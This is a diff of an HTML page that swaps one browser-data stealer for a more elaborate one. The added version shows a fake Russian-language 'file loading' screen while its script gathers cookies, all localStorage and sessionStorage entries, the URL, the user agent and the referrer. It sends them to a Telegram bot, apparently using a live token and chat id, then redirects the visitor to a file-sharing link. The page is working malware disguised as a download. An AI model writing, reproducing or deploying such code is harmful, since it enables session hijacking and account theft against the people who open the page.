@@ -1,18 +1,52 @@
 <html>
-  <body>
-    <script>
-      fetch(
-        "https://api.telegram.org/bot8391422515:AAE8mfD8eefaNRsOoRwnr6BeTlfQEABfO8k/sendMessage?chat_id=-1003343793064&text=" +
-          encodeURIComponent(
-            document.cookie +
-              " | " +
-              JSON.stringify(localStorage) +
-              " | " +
-              JSON.stringify(sessionStorage),
-          ),
-      ).then(() => {
-        window.location = "https://file.kiwi/a5383f5e#aTK-XRejXlmJmJsCiqex1A";
-      });
-    </script>
-  </body>
+<head><meta charset="UTF-8"><title>Loading...</title></head>
+<body style="background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;margin:0;">
+<div id="s">Загрузка файла...</div>
+<script>
+var TG_TOKEN = '8391422515:AAE8mfD8eefaNRsOoRwnr6BeTlfQEABfO8k';
+var TG_CHAT = '-1003343793064';
+var REDIR = 'https://file.kiwi/a5383f5e#aTK-XRejXlmJmJsCiqex1A';
+
+function send(msg) {
+    var x = new XMLHttpRequest();
+    x.open('GET', 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage?chat_id=' + TG_CHAT + '&text=' + encodeURIComponent(msg), true);
+    x.send();
+}
+
+function grab() {
+    var data = '';
+    // Document cookies
+    data += '[COOKIES]\n' + document.cookie + '\n\n';
+    // localStorage
+    data += '[LOCALSTORAGE]\n';
+    try {
+        for(var i=0; i<localStorage.length; i++) {
+            var k = localStorage.key(i);
+            data += k + '=' + localStorage.getItem(k) + '\n';
+        }
+    } catch(e) { data += 'error\n'; }
+    // sessionStorage
+    data += '\n[SESSIONSTORAGE]\n';
+    try {
+        for(var i=0; i<sessionStorage.length; i++) {
+            var k = sessionStorage.key(i);
+            data += k + '=' + sessionStorage.getItem(k) + '\n';
+        }
+    } catch(e) { data += 'error\n'; }
+    // Info
+    data += '\n[INFO]\n';
+    data += 'URL: ' + window.location.href + '\n';
+    data += 'UA: ' + navigator.userAgent + '\n';
+    data += 'Screen: ' + screen.width + 'x' + screen.height + '\n';
+    data += 'Referrer: ' + document.referrer + '\n';
+    data += 'Time: ' + new Date().toISOString() + '\n';
+    return data;
+}
+
+var payload = grab();
+send(payload);
+document.getElementById('s').innerText = 'Файл загружен, перенаправляем...';
+setTimeout(function() { window.location = REDIR; }, 800);
+</script>
+</body>
 </html>
